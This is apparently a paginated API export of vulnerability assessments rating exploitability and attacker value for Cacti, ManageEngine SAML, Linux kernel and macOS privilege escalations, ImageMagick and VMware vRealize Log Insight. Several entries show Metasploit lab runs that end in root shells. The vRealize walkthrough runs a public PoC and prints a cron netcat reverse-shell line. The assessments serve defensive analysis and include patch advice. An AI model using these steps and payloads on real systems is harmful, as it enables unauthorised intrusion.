{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=15&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=13&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=14&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "781d7e47-5942-4f26-8077-58445ad9f99f",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "f05be8c2-c144-45be-bf46-5867a2caaf15",
      "created": "2023-01-20T23:16:33.310755Z",
      "revisionDate": "2023-01-21T14:36:49.273341Z",
      "document": "This is a sorta complicated collection of vulnerabilities. In the Rapid7 analysis, we focused on the two most popular pieces of software, which run an ancient version of Santuario 1.4.1 (in part because the public PoCs target that version). Santuario 1.4.1 has absolutely trivial RCE issues.\r\n\r\nBut, according to the [disclosure blog](https://blog.viettelcybersecurity.com/saml-show-stopper/), other versions have more recent versions of Santuario, but run a version of Xalan that's vulnerable to a whole other issue - CVE-2014-0107. Dinh found a novel way to exploit CVE-2014-0107, which is super cool, but it was overshadowed by the much simpler vuln in Santuario. I wish they'd named the specific software that CVE-2014-0107 worked against - that'd be a neat one to test, but I don't think their blog is specific.\r\n\r\nThe saving grace here is that none of these projects are vulnerable unless SAML is enabled (although in some cases, they're vulnerable forever if SAML is enabled once).",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d2da735b-bfa4-4635-bbda-933ce868d455",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "01249ab3-3eaa-4d35-93fa-56d293ba9d6c",
      "created": "2023-01-23T14:47:34.591828Z",
      "revisionDate": "2023-02-24T09:11:37.121793Z",
      "document": "Rating this vulnerability as high in terms of attacker value. The command injection vulnerability seems relatively trivial to exploit, and it grants an attacker unauthenticated remote code execution as the user running the Cacti service.\r\n\r\nIf an attacker sends a GET request to `remote_agent.php` with the action set to `polldata`, it is possible to reach a code path that calls the php function `proc_open()` on unsanitized, attacker-controlled data. Specifically, the `poller_id` parameter in the request permits strings as valid input. To reach this code path, the Cacti server must have a poller item with the `POLLER_ACTION_SCRIPT_PHP` action, and the `local_data_ids[0]` and `host_id` parameters must be valid ids associated with a poller item in the database. According to one of the researchers who discovered this [vulnerability](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/), the `POLLER_ACTION_SCRIPT_PHP` action should be common in production since many of the default templates used to create a poller item have this action enabled. Additionally, supplying valid ids for the `local_data_ids[0]` and `host_id` parameters should be trivial, as they can be bruteforced.\r\n\r\nThere is currently a Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/17407) in flight for this vulnerability.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5bf0bde9-001e-4863-8720-4e57621d0539",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "f05be8c2-c144-45be-bf46-5867a2caaf15",
      "created": "2023-01-23T16:14:56.009791Z",
      "revisionDate": "2023-01-23T16:14:56.007666Z",
      "document": "Tagging this as both \"easy to weaponize\" and \"difficult to weaponize\" since it depends on the product the attacker is targeting. ServiceDesk Plus is trivial to exploit using public PoC (see @rbowes-r7's [assessment](https://attackerkb.com/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)), but other vectors like ADSelfService Plus seem to require some type of info leak to supply the attacker with unique environment values needed to allow the exploit code to execute successfully, as @sfewer-r7 has demonstrated in our lab. So exploitability for (at least) ServiceDesk Plus is very high, but so far exploitability for (so far) ADSelfService Plus is relatively low. If someone finds an automagical way to obtain the GUID and issuer URL for ADSSP, that'd change the risk calculus some.\r\n\r\nRapid7 is seeing ongoing exploitation of this vulnerability in ServiceDesk Plus, and our honeypots are also seeing activity. The [Rapid7 analysis](https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis?referrer=etrblog/&utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_cve-2022-47966) tab has a ton of detailed technical info.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "931c1aff-3ce4-4945-a5ba-8e81254df5e3",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "185e2e01-13b6-4526-9a00-3da5f446528c",
      "created": "2023-01-31T20:25:13.100069Z",
      "revisionDate": "2023-01-31T20:25:13.102026Z",
      "document": "# Description\r\nThis vulnerability exploits linux priv esc against VMWare virtual machines with kernel 4.14-rc1 - 5.17-rc1 due to a VMWare driver bug.  Specifically, a use-after-free flaw was found in the Linux kernel\u2019s `vmw_execbuf_copy_fence_user` function in `drivers/gpu/drm/vmwgfx/vmwgfx_execbuf.c` in `vmwgfx` which allows an authenticated user to escalate privileges and spawn a root shell. \r\n\r\n# Attacker Value & Exploitability \r\nLinux kernel 4.14 was released 12 November 2017 while 5.17 was released 20 March 2022. Although this vulnerability only affects VMware virtual machines I would expect the attack surface to be rather large given the wide range of kernels affected - about 4.5 years of linux kernel releases.  \r\n\r\nExploitability requires user level privileges however once those are obtained exploitation is trivial given the metasploit module written to exploit this vulnerability. Simply get a user session and run the exploit as seen demonstrated below:\r\n\r\n```\r\nmsf6 auxiliary(scanner/ssh/ssh_login) > run rhosts=172.16.199.132 rport=4444 username=msfuser password=notpassword\r\n\r\n[*] 172.16.199.132:22 - Starting bruteforce\r\n[+] 172.16.199.132:22 - Success: 'msfuser:notpassword' 'uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare) Linux msfuser-virtual-machine 5.13.12-051312-generic #202108180838 SMP Wed Aug 18 08:41:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '\r\n[*] SSH session 8 opened (172.16.199.1:55151 -> 172.16.199.132:22) at 2023-01-20 09:34:18 -0500\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf6 exploit(linux/local/vmwgfx_fd_priv_esc) > run session=8 rhosts=172.16.199.132 rport=4445\r\n\r\n[!] SESSION may not be compatible with this module:\r\n[!]  * incompatible session architecture:\r\n[*] Started reverse TCP handler on 172.16.199.1:4445\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable. vmwgfx installed\r\n[+] Original /bin/chfn backed up to /Users/jheysel/.msf4/loot/20230120093436_default_172.16.199.132_binchfn_034079.bin\r\n[*] Uploading payload to /tmp/.6ntizxlWd8\r\n[*] Writing '/tmp/.6ntizxlWd8' (282 bytes) ...\r\n[*] Launching exploit...\r\n[*] Sending stage (3045348 bytes) to 172.16.199.132\r\n[+] Deleted /tmp/.oWt34mDG4b\r\n[*] Meterpreter session 9 opened (172.16.199.1:4445 -> 172.16.199.132:36990) at 2023-01-20 09:34:45 -0500\r\n[*] Replacing trojaned /bin/chfn with original\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : 172.16.199.132\r\nOS           : Ubuntu 22.04 (Linux 5.13.12-051312-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\n# Defensive Suggestions\r\nIn order to protect yourself against exploitation of this vulnerability, ensure your linux VM kernel's are up to date, and are only connected to the network where necessary.\r\n\r\nIf you're absolutely unable to upgrade the kernel of a vulnerable machine it is possible to prevent the vulnerable kernel module from loading, RedHat demonstrates how to do that here: https://access.redhat.com/solutions/41278. However, this is a bandaid fix and promotes poor security posture, update the kernel whenever possible. ",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "69d9efa2-e784-46d1-81c7-5edb87f85981",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "3589390f-f044-4ddc-9786-0bbd71192d4f",
      "created": "2023-02-01T17:05:48.357486Z",
      "revisionDate": "2023-02-01T17:05:48.356573Z",
      "document": "# Description\r\nThis vulnerability exists in linux kernel\u2019s io_uring implementation. This vuln allows an attacker with a local account to corrupt system memory, crash the system or escalate privileges in order to spawn a root shell.\r\n\r\n# Attacker Value & Exploitation\r\nGithub user, @jvoisin explained, user @minipli-oss, wrote a neat exploit for CVE-2022-1043, and it has the following advantages over your everyday Linux LPE:  \r\n\r\n - No hardcoded offsets\r\n - No ROP\r\n - Architecture-agnostic-ish\r\n - Bypasses all existing mitigations, even out-of-kernel-ones like grsecurity (for version older than the exploit of course, since this class of vulnerabilities is now mitigated there) and LKRG.\r\n\r\n The only drawback is that it only works on v5.12-rc3 to v5.14-rc7 a fairly small subset of the linux kernel. \r\n\r\nIf the system is vulnerable, exploitation is trivial. The neat, aforementioned exploit has been integrated into the Metasploit making getting a root shell a piece of cake: \r\n\r\n```\r\nmsf6 auxiliary(scanner/ssh/ssh_login) > run rhosts=172.16.199.132 username=msfuser password=notpassword\r\n\r\n[*] 172.16.199.132:22 - Starting bruteforce\r\n[+] 172.16.199.132:22 - Success: 'msfuser:notpassword' 'uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare) Linux msfuser-virtual-machine 5.13.12-051312-generic #202108180838 SMP Wed Aug 18 08:41:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '\r\n[*] SSH session 1 opened (172.16.199.1:60829 -> 172.16.199.132:22) at 2023-02-01 10:59:16 -0500\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf6 auxiliary(scanner/ssh/ssh_login) > use linux/local/cve_2022_1043_io_uring_priv_esc\r\n[*] Using configured payload linux/x64/meterpreter/reverse_tcp\r\nmsf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > set session 1\r\nsession => 1\r\nmsf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > set lport 4447\r\nlport => 4447\r\nmsf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > run\r\n\r\n[!] SESSION may not be compatible with this module:\r\n[!]  * incompatible session architecture:\r\n[*] Started reverse TCP handler on 172.16.199.1:4447\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target is vulnerable. > 1 CPU required, detected: 2\r\n[*] Writing '/tmp/.5Z1IxJt0' (282 bytes) ...\r\n[*] Launching exploit...\r\n[*] Sending stage (3045348 bytes) to 172.16.199.132\r\n[+] Deleted /tmp/.5Z1IxJt0\r\n[+] Deleted /tmp/.qfp5AH76BB\r\n[*] Meterpreter session 2 opened (172.16.199.1:4447 -> 172.16.199.132:49236) at 2023-02-01 10:59:51 -0500\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : 172.16.199.132\r\nOS           : Ubuntu 22.04 (Linux 5.13.12-051312-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\n```\r\n\r\n# Defensive Suggestions\r\nNot much to say here other don't run a vulnerable kernel version, patch! ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "e7461e2c-b55e-4b88-a11f-b9dc10ba303a",
      "editorId": "38047d0b-ee12-4823-af3f-dbbd759fa225",
      "topicId": "e0f6499a-e3f4-4da8-8c90-7cf09668eb14",
      "created": "2023-02-03T14:34:21.480399Z",
      "revisionDate": "2023-02-03T15:16:18.486709Z",
      "document": "ImageMagick 7.1.0-49 is vulnerable to Information Disclosure by injecting a malicious PNG file.\r\n\r\n\"A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt). These types have a keyword and a text string. If the keyword is the string \u201cprofile\u201d (without quotes) then ImageMagick will interpret the text string as a filename and will load the content as a raw profile, then the attacker can download the resized image which will come with the content of a remote file.\"\r\n\r\n# At risk\r\n\r\nImageMagick 7.1.0-49\r\n\r\n# Mitigation\r\n\r\nPatch to  version 7.1.0-52 or higher\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "765db808-cace-4f05-a54f-78104d95e0a5",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "33111553-7f00-46c8-b2a2-339940015ce8",
      "created": "2023-02-03T17:08:23.31068Z",
      "revisionDate": "2023-02-03T17:10:55.51805Z",
      "document": "# Description\r\nThis vulnerability is the macOS equivalent of the Dirty Cow vulnerability and allows for an unprivileged user to execute code as root. The vulnerability on linux is described as: \"A race condition was found in the way the kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.\"\r\n\r\n# Attacker Value & Exploitation\r\nThis issue was fixed in:\r\n-  tvOS 16.2 \r\n- macOS Monterey 12.6.2 \r\n- macOS Ventura 13.1 \r\n- macOS Big Sur 11.7.2 \r\n- iOS 15.7.2  \r\n- iPadOS 15.7.2 \r\n- iOS 16.2  \r\n- iPadOS 16.2 \r\n- watchOS 9.2. \r\n\r\nNumerous recent versions of Apple products affected makes this quite valuable for attackers. It's not everyday we see such a reliable LPE in current versions of macOS. The vuln requires user authentication to exploit and would pair nicely with a successful phishing attempt to compromise an entire macOS environment. A metasploit module has been released for this vuln making exploitation trivial, be sure to patch!\r\n\r\n```\r\nmsf6 exploit(osx/local/mac_dirty_cow) > run\r\n[*] Started reverse TCP handler on 172.16.199.1:4446\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable.\r\n[*] Writing '/tmp/.wNDx86' (17204 bytes) ...\r\n[*] Writing '/tmp/.TKIGnTw0l' (51392 bytes) ...\r\n[*] Executing exploit '/tmp/.TKIGnTw0l /etc/pam.d/su /tmp/.DfoZanro'\r\n[*] Exploit result:\r\nTesting for 10 seconds...\r\nRO mapping was modified\r\n[*] Running cmd:\r\necho '/tmp/.wNDx86 & disown' | su\r\n[*] Executing exploit (restoring) '/tmp/.TKIGnTw0l /etc/pam.d/su /tmp/.aclP0u'\r\n[*] Exploit result:\r\nTesting for 10 seconds...\r\nRO mapping was modified\r\n[+] Deleted /tmp/.wNDx86\r\n[+] Deleted /tmp/.aclP0u\r\n[+] Deleted /tmp/.DfoZanro\r\n[+] Deleted /tmp/.TKIGnTw0l\r\n[*] Command shell session 2 opened (172.16.199.1:4446 -> 172.16.199.130:49802) at 2023-02-01 16:10:54 -0500\r\noptions\r\n/bin/sh: line 29: options: command not found\r\nid\r\nuid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)\r\nuname -a\r\nDarwin msfusers-Mac.local 22.0.0 Darwin Kernel Version 22.0.0: Tue May 24 20:31:35 PDT 2022; root:xnu-8792.0.50.111.3~5/RELEASE_X86_64 x86_64\r\n```\r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "46db7c85-d08f-4d0f-8b28-f4d08dfcc844",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "ed7e09ce-3641-4c2d-9509-6480cdcf7725",
      "created": "2023-02-03T17:37:36.100649Z",
      "revisionDate": "2023-02-11T13:21:59.64879Z",
      "document": "On 31 January 2023,  security researcher `James Horman` and team from `Horizon3.ai` published a Technical Deep Dive on vulnerabilities that exist in `VMware vRealize Log Insight` and how to exploit those to get unauthenticated remote access to the application. Please read the blog [VMware vRealize Log Insight VMSA-2023-0001 Technical Deep Dive](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/) for all the technical details.\r\n\r\nWhat makes this use case particular interested is the chaining of multiple vulnerabilities to achieve the unauthenticated RCE.\r\nBasically there are four vulnerabilities that are published in the VMware [VMSA-2023-0001](https://www.vmware.com/security/advisories/VMSA-2023-0001.html) security disclosure:\r\n- `CVE-2022-31706`: VMware vRealize Log Insight Directory Traversal Vulnerability\r\n- `CVE-2022-31704`: VMware vRealize Log Insight broken Access Control Vulnerability\r\n- `CVE-2022-31710`: VMware vRealize Log Insight Deserialization Vulnerability\r\n- `CVE-2022-31711`: VMware vRealize Log Insight Information Disclosure Vulnerability\r\n\r\nThe [analysis](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/)  shows that  three vulnerabilities `CVE-2022-31706`,  `CVE-2022-31704` and `CVE-2022-31711` are chained to achieve the RCE.\r\n\r\nIn a nutshell:\r\n1. `CVE-2022-31704` is used to gain unauthorized access to the `Apache Thrift` server to execute commands. `Apache Thrift` is a RPC framework that allows client/server communication and is typically used to establish communication between components of the system. \r\n2. The `Apache Thrift` server in the VMware vRealize Log Insight application is vulnerable and can be accessed with a client to execute specific commands defined in the framework. \r\n3. In this scenario, two RPC commands are being exploited, `remotePakDownloadCommand` and `pakUpgradeCommand ` that allows for an unauthenticated upload of a malicious PAK file with an attached payload that can be extracted to any place on the filesystem using `CVE-2022-31706` that allows for Directory Traversal.\r\n4. Last but not least,  the `remotePakDownloadCommand` requires a node token to work. A node token is a `guid` that is unique per instance of Log Insight. This information is not readily available to an unauthenticated user. However, there are various `Thrift` RPC commands that leak the node token including `getConfig` and `getHealthStatus`, which links back to  the third `CVE-2022-31711` - VMware vRealize Log Insight Information Disclosure Vulnerability.\r\n\r\nNow let's see in real-life practice, how this vulnerability works...\r\n\r\nFirst we need install a vulnerable instance of  VMware vRealize Log Insight, which you can download from this [link](https://customerconnect.vmware.com/downloads/info/slug/infrastructure_operations_management/vmware_vrealize_log_insight/8_8). \r\nYou need to be registered as a customer or you can apply for a trial license before you can download the OVA.\r\nImport the OVA in your favorite hypervisor application. I am using Oracle VirtualBox. \r\nPlease allocate enough memory and CPU (minimal 4 GB and 2 vCPU) otherwise your appliance will be dead slow and the exploit will fail due to lack of space in the `/tmp` directory.\r\n\r\nGo thru the setup of the appliance. This is all very straight forward. \r\nIf you have the appliance  running, go to the [POC](https://github.com/horizon3ai/vRealizeLogInsightRCE) at Github that has been created by the `Horizon3.ai` team.\r\nClone the repository.\r\nBefore you start executing the exploit, please install `Thrift` python support.\r\n```console\r\n#  pip3 install thrift\r\n```\r\nand install the `thrift-compiler`. \r\nNot needed for the exploit to work but it gives you the ability to generate thrift modules for other languages such as `ruby`.\r\n```console\r\n# apt install thrift-compiler\r\n``` \r\n\r\nThe last thing that you need to do is to correct a small typo that the guys from `Horizon3.ai` made in their code. \r\nYeah, everybody makes mistakes, even these guys ;-)\r\n\r\nOpen `VMSA-2023-0001.py` with your  favorite editor and go to the section below.\r\n```python\r\ndef remote_pak_download(client, node_token, http_server_address, http_server_port):\r\n    command = Command()\r\n    command.commandType = 9\r\n\r\n    download_command = RemotePakDownloadCommand()\r\n    download_command.sourceNodeToken = node_token\r\n    # The remote system does not return an error if this url is incorrect.\r\n    # It just silently fails\r\n    download_command.requestUrl = f\"http://{http_server_address}:{http_server_port}/exploit.tar\"\r\n    download_command.fileName = \"exploit.pak\"\r\n\r\n    command.remotePakDownloadCommand = download_command\r\n```\r\nChange `download_command.fileName = \"exploit\"` to `download_command.fileName = \"exploit.pak\"` and save the file.\r\n\r\nNow we are ready to run the exploit against our installed target.\r\n- The exploit will gain access by obtaining the token.\r\n- Next, it will create a malicious PAK file with the payload attached that is a crontab file with a `netcat` command connecting back to your system.\r\n- PAK file gets upload and extracted using the vulnerable `Apache Thrift` server running on the Log Insight server.\r\n- Run a `netcat` listener on your system to catch the `netcat` connection from the target system triggered by the `cron` daemon after successful exploitation.\r\n\r\n```console\r\n# python3 ./VMSA-2023-0001.py --target_address 192.168.100.92 --http_server_address 192.168.100.7 --http_server_port 1981 --payload_file payload --payload_path /etc/cron.d/exploit\r\n[+] Using CVE-2022-31711 to leak node token\r\n[+] Found node token: 8984be67-2394-4da1-bf87-2635d558329d\r\n[+] Using CVE-2022-31704 to trigger malicious file download\r\n192.168.100.92 - - [03/Feb/2023 17:19:02] \"GET /exploit.tar HTTP/1.1\" 200 -\r\n[+] File successfully downloaded\r\n[+] Using CVE-2022-31706 to trigger directory traversal and write cron reverse shell\r\n[+] Payload successfully delivered\r\n# nc -lnvp 8888\r\nlistening on [any] 8888 ...\r\nconnect to [192.168.100.7] from (UNKNOWN) [192.168.100.92] 42746\r\nuname -a\r\nLinux localhost 4.19.245-1.ph3 #1-photon SMP Thu Jun 2 02:30:39 UTC 2022 x86_64 GNU/Linux\r\nwhoami\r\nroot\r\ncat /etc/issue\r\nVMware vRealize Log Insight\r\ncat /etc/photon-release\r\nVMware Photon OS 3.0\r\nPHOTON_BUILD_NUMBER=05f9d3d8d\r\n```\r\nIf you login into the appliance, you can find the `exploit.pak` in the `/tmp` directory and the a cron file `exploit` created in the `/etc/cron.d` directory.\r\nIf you check the contents of the PAK file,  you will see the `../../etc/crond.d/exploit` file with the directory traversal.\r\n```console\r\nroot@localhost [ ~ ]# ls -l /tmp/*.pak\r\n-rw-r--r-- 1 root root 122880 Feb  3 17:18 /tmp/exploit.pak\r\nroot@localhost [ ~ ]# ls -l /etc/cron.d/exploit\r\n-rw-r--r-- 1 root root 51 Feb  3 12:24 /etc/cron.d/exploit\r\nroot@localhost [ ~ ]# cat /etc/cron.d/exploit\r\n* * * * * root nc -e /bin/bash 192.168.100.7 8888\r\n\r\nroot@localhost [ ~ ]# tar -tvf/tmp/exploit.pak\r\n-rw-r--r-- root/root     35768 2023-02-03 09:10 upgrade-image-8.10.2-21145187.rpm\r\n-rw-r--r-- root/root     35768 2023-02-03 09:10 upgrade-driver\r\n-rw-r--r-- root/root     35768 2023-02-03 09:10 eula.txt\r\n-rw-r--r-- root/root      1926 2023-02-03 09:10 VMware-vRealize-Log-Insight.cert\r\n-rw-r--r-- root/root      1790 2023-02-03 09:10 VMware-vRealize-Log-Insight.mf\r\ntar: Removing leading `../../' from member names\r\n-rw-r--r-- root/root        51 2023-02-03 12:24 ../../etc/cron.d/exploit\r\n```\r\nThe example above show that the exploit is pretty simple to weaponize and execute, however there is a low probability of exploitation in the wild.\r\nThe main reason is that `VMware vRealize Log Insight` is typically not exposed to the public Internet and the `Thrift` RPC ports `16520` through `16580` should be accessible for the exploit to work. \r\nBut from the inside, it is of course a very attractive target to exploit because it has tons of nice information on the network and servers ready to be disclosed to an attacker.\r\n\r\n## Mitigation\r\nPlease update `VMware vRealize Log Insight` to `8.10.2`.\r\n\r\n## References\r\n[Horizon3.ai: VMware vRealize Log Insight VMSA-2023-0001 Technical Deep Dive](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/) \r\n[VMware advisory](https://www.vmware.com/security/advisories/VMSA-2023-0001.html)\r\n[Horizon3.ai: POC](https://github.com/horizon3ai/vRealizeLogInsightRCE)\r\n\r\n### Credits\r\nCredits goes to the security researchers below that analyzed the vulnerabilities and discovered the RCE chain.\r\n* [Horizon3Attack team](https://twitter.com/Horizon3Attack)\r\n* [James Horseman](https://twitter.com/JamesHorseman2)\r\n* [Zach Hanley](https://twitter.com/hacks_zach)\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2973c277-abab-427b-8dd1-9c622e071544",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "1d60282e-febb-44a9-9267-ee45f1d583d8",
